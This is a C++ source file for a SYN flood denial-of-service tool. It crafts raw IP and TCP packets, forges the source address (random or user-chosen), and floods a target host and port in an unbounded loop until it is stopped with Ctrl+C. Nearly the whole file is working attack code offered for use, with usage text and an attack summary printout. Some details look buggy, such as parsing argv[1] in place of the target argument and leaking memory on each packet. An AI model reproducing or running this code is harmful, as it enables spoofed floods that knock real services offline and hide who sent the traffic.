#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <cstring>
#include <arpa/inet.h>
#include <iostream>
#include <signal.h>

using namespace std;

#define LOCAL_PORT 7777

static volatile int keepAttack = 1;
long int packetCount = 0;
char spoofedIP[32];
int DEST_PORT = 80; //default attacked port for web
int hostArg=-1,spfArf=-1;

/* 
	96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

void keystroke_handler(int dummy)
{
	keepAttack = 0;

	cout<<"\n\n*******Attack Summary********\n"<<endl;
	cout << "Attack is terminated" << endl;
	if(spfArf==-1) cout<<"Spoofed IP Address: random" <<endl;
	else cout<<"Spoofed IP Address: "<<spoofedIP<<endl;
	cout << "Total Packet sent: " << packetCount << endl;
}
/* The following is the algorithm of the first checksum */

unsigned short check_sum(unsigned short *ptr, int nbytes)
{
	long sum;
	short oddbyte;
	short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char *)&oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return (answer);
}


void send_packet(int sockfd, struct sockaddr_in *addr)
{
	//TCP Packet = IP Header + TCP Header + Data
	char buffer[4096]; //data packets placement buffer
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct pseudo_header ph;
	int head_len; //+ strlen(data);
	//no content
	head_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	memset(buffer, 0, 4096);

	//data = buffer + sizeof(struct iphdr) + sizeof(struct tcphdr);
	//strcpy(data, "AAAAAAAAAAAAAAAAAAAAAAAA");

	iph = (struct iphdr *)buffer;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;	// Service type
	iph->tot_len = head_len; 
	iph->id = 0;	 //the system fill it in
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; //set again later

	while (keepAttack)
	{
		//Spoof the source ip address
		if(spfArf==-1) iph->saddr=random();
		else iph->saddr=inet_addr(spoofedIP);
		iph->daddr = addr->sin_addr.s_addr;
		iph->check = check_sum((unsigned short *)buffer, iph->tot_len);

		tcph = (struct tcphdr *)(buffer + sizeof(struct ip));
		tcph->source = htons(LOCAL_PORT);
		tcph->dest = htons(DEST_PORT);
		tcph->seq = 0;
		tcph->ack_seq = 0;
		tcph->doff = 5; //tcp header size
		tcph->fin = 0;
		tcph->syn = 1;
		tcph->rst = 0;
		tcph->psh = 0;
		tcph->ack = 0;
		tcph->urg = 0;
		tcph->window = 0;
		tcph->check = 0;
		tcph->urg_ptr = 0;

		ph.source_address = iph->saddr;
		ph.dest_address = addr->sin_addr.s_addr;
		ph.placeholder = 0;
		ph.protocol = IPPROTO_TCP;
		ph.tcp_length = htons(sizeof(struct tcphdr));

		int ph_len = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
		char *pseudogram = (char *)malloc(ph_len);

		memcpy(pseudogram, (char *)&ph, sizeof(struct pseudo_header));
		memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

		tcph->check = check_sum((unsigned short *)pseudogram, ph_len);

		sendto(sockfd, buffer, iph->tot_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
		packetCount++;
	}
}

void usageMAN()
{
	cout<<"-help	show this manual"<<endl;
	cout<<"-a   	attack address ( must be given )"<<endl;
	cout<<"-port   port to be attacked ( Default: 80 ) "<<endl;
	cout<<"-sp     spoofed IP address ( Default: random on each packet )"<<endl;
}

int main(int argc, char **argv)
{
	int sockfd;
	char *ip_addr;
	struct sockaddr_in addr;
	struct hostent *host;
	if (argc == 0 || (argc%2)==0)
	{
		cout<<endl;
		cout << "Command Error: Usage Commands "<< endl;
		usageMAN();
		exit(1);
	}

	bool isA=false;
	for(int i=1;i<argc;i+=2)
	{
		if(!strcmp(argv[i],"-a")) isA=true;
		// cout<<argv[i];
	}
	// cout<<isA<<endl;
	if(!isA)
	{
		cout << "Command Error: Usage Commands "<< endl;
		usageMAN();
		exit(1);
	}

	for(int i=1;i<argc;i+=2)
	{
		if(!strcmp(argv[i],"-a"))
		{
			hostArg=i+1;
		}
		else if(!strcmp(argv[i],"-port"))
		{
			DEST_PORT=atoi(argv[i+1]);
		}
		else if(!strcmp(argv[i],"-sp"))
		{
			spfArf=i+1;
		}
		else
		{
			usageMAN();
			exit(1);
		}
	}

	memset(&addr, 0, sizeof(struct sockaddr_in));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(DEST_PORT);
	if (inet_aton(argv[1], &addr.sin_addr) == 0)
	{
		host = gethostbyname(argv[hostArg]);
		if (host == NULL)
		{
			cout << "Hostname Error: " << hstrerror(h_errno) << endl;
			exit(1);
		}
		addr.sin_addr = *(struct in_addr *)(host->h_addr_list[0]);
	}

	if(spfArf!=-1)
	{
		strcpy(spoofedIP,argv[spfArf]);
	}

	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sockfd < 0)
	{
		cout << "Socket Error: Try to run in previledged mode";
		exit(1);
	}

	setuid(getpid());

	cout << "Attack is starting for " << argv[hostArg] << " on the port " << DEST_PORT << ". Spoofed IP Address ( ";
	if(spfArf==-1) cout<<"random )....."<<endl;
	else cout<< argv[spfArf]<<" )....."<<endl;
	cout << "Press <Ctrl+C> anytime to end DoS Attack.\n";

	signal(SIGINT, keystroke_handler);
	send_packet(sockfd, &addr);
}